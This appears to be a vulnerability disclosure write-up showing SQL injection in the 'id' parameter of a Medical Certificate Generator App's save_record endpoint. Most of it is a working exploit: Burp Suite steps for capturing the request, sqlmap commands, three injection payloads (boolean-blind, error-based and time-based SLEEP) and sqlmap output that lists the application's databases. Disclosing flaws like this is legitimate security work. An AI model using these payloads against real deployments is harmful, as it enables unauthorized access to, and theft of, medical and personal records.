---
slug: medical-certificate-generator-app-save_record
title: Medical Record Generator App (action.php?action=save_record)
---


## Details

### Related Code file: 
`/mcg/action.php?action=save_record`

## Injection parameter: 
`MULTIPART id`


## POC

![1](https://github.com/user-attachments/assets/a691b5cc-5e8d-4fb2-aa14-09beaecfb161)

Intercept the request using Burpsuite Proxy.

![2](https://github.com/user-attachments/assets/11b0e2b7-80d6-4b56-ac4d-f7e52dfcb5d0)

Save the request to `save_record.txt`.

### Verify vulnerability

```
sqlmap -r save_record.txt --batch
```

![53](https://github.com/user-attachments/assets/1bee3c2e-383e-48ec-9b9f-c92ae2bbedc9)

```
Parameter: id (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: id=' RLIKE (SELECT (CASE WHEN (1247=1247) THEN '' ELSE 0x28 END)) AND 'aSHa'='aSHa&lastname=test&firstname=test&middlename=test&suffix=&dob=2009-06-30&gender=Male&civil_status=Single&contact=123456789&nationality=test&address=test&diagnostic=test&remarks=test&doctor_fullname=test&doctor_suffix=test

    Type: error-based
    Title: MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)
    Payload: id=' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a707871,(SELECT (ELT(9233=9233,1))),0x717a787a71,0x78))s), 8446744073709551610, 8446744073709551610))) AND 'wCMG'='wCMG&lastname=test&firstname=test&middlename=test&suffix=&dob=2009-06-30&gender=Male&civil_status=Single&contact=123456789&nationality=test&address=test&diagnostic=test&remarks=test&doctor_fullname=test&doctor_suffix=test

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)
    Payload: id=' AND (SELECT 8988 FROM (SELECT(SLEEP(5)))DKYw)#&lastname=test&firstname=test&middlename=test&suffix=&dob=2009-06-30&gender=Male&civil_status=Single&contact=123456789&nationality=test&address=test&diagnostic=test&remarks=test&doctor_fullname=test&doctor_suffix=test
```


### Dump databases

```
sqlmap -r save_record.txt --batch --dbs
```

![54](https://github.com/user-attachments/assets/e1fc5314-643d-4db2-9fdf-ac285d4d4658)

```
[05:58:41] [INFO] fetching database names
[05:58:41] [INFO] retrieved: 'information_schema'
[05:58:41] [INFO] retrieved: 'mcg'
available databases [2]:
[*] information_schema
[*] mcg
```
